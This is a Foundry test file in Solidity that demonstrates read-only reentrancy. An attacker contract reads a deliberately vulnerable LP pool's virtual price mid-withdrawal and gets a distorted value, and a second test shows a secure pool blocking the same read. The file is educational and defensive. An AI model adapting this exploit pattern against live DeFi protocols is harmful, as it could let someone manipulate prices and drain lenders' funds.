// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test, console} from "forge-std/Test.sol";
import {
    VulnerableLPPool,
    VulnerableLendingPlatform,
    SecureLPPool
} from "../src/vulnerabilities/ReadOnlyReentrancy.sol";

/// @notice Attacker contract exploiting read-only reentrancy during LP pool withdrawal
contract ReadOnlyAttacker {
    VulnerableLPPool public vulnPool;
    SecureLPPool public securePool;

    uint256 public interceptedVirtualPrice;
    bool public exploitSucceeded;
    bool public secureAttackReverted;

    constructor(address _vulnPool, address _securePool) {
        vulnPool = VulnerableLPPool(_vulnPool);
        securePool = SecureLPPool(_securePool);
    }

    function attackVuln() external payable {
        vulnPool.deposit{value: msg.value}();
        vulnPool.withdraw(msg.value);
    }

    function attackSecure() external payable {
        securePool.deposit{value: msg.value}();
        securePool.withdraw(msg.value);
    }

    receive() external payable {
        // Intercept execution mid-withdrawal
        if (msg.sender == address(vulnPool)) {
            // Read virtual price from vulnerable pool while locked
            interceptedVirtualPrice = vulnPool.getVirtualPrice();
            exploitSucceeded = true;
        } else if (msg.sender == address(securePool)) {
            // Attempting to read virtual price from secure pool while locked
            try securePool.getVirtualPrice() returns (uint256) {
                exploitSucceeded = true;
            } catch {
                secureAttackReverted = true;
            }
        }
    }
}

contract ReadOnlyReentrancyTest is Test {
    VulnerableLPPool public vulnPool;
    VulnerableLendingPlatform public lendingPlatform;
    SecureLPPool public securePool;

    address public honestLP = address(0x101);
    address public attackerUser = address(0xBAD);

    function setUp() public {
        vulnPool = new VulnerableLPPool();
        lendingPlatform = new VulnerableLendingPlatform(address(vulnPool));
        securePool = new SecureLPPool();

        // Honest LP deposits 10 ETH into both pools
        vm.deal(honestLP, 20 ether);
        vm.prank(honestLP);
        vulnPool.deposit{value: 10 ether}();

        vm.prank(honestLP);
        securePool.deposit{value: 10 ether}();
    }

    /// @notice Proves the vulnerability: Virtual price can be manipulated mid-transaction (Read-Only Reentrancy)
    function test_Exploit_ReadOnlyReentrancyDistortsView() public {
        ReadOnlyAttacker attacker = new ReadOnlyAttacker(address(vulnPool), address(securePool));

        vm.deal(attackerUser, 10 ether);
        vm.prank(attackerUser);
        attacker.attackVuln{value: 10 ether}();

        // Normal virtual price is 1 ETH (1e18)
        // Mid-transaction, price dropped to 0.5 ETH (5e17) because totalShares wasn't updated!
        assertTrue(attacker.exploitSucceeded());
        assertEq(attacker.interceptedVirtualPrice(), 0.5 ether);
        console.log("[CRITICAL CONFIRMED] Read-only reentrancy successfully distorted virtual price to:", attacker.interceptedVirtualPrice());
    }

    /// @notice Proves the mitigation: Secure pool actively reverts getVirtualPrice() when queried mid-transaction
    function test_Mitigation_ReadOnlyReentrancyBlocked() public {
        ReadOnlyAttacker attacker = new ReadOnlyAttacker(address(vulnPool), address(securePool));

        vm.deal(attackerUser, 10 ether);
        vm.prank(attackerUser);
        attacker.attackSecure{value: 10 ether}();

        assertTrue(attacker.secureAttackReverted());
        console.log("[SECURITY VERIFIED] Secure pool blocked read-only reentrancy query mid-transaction!");
    }
}
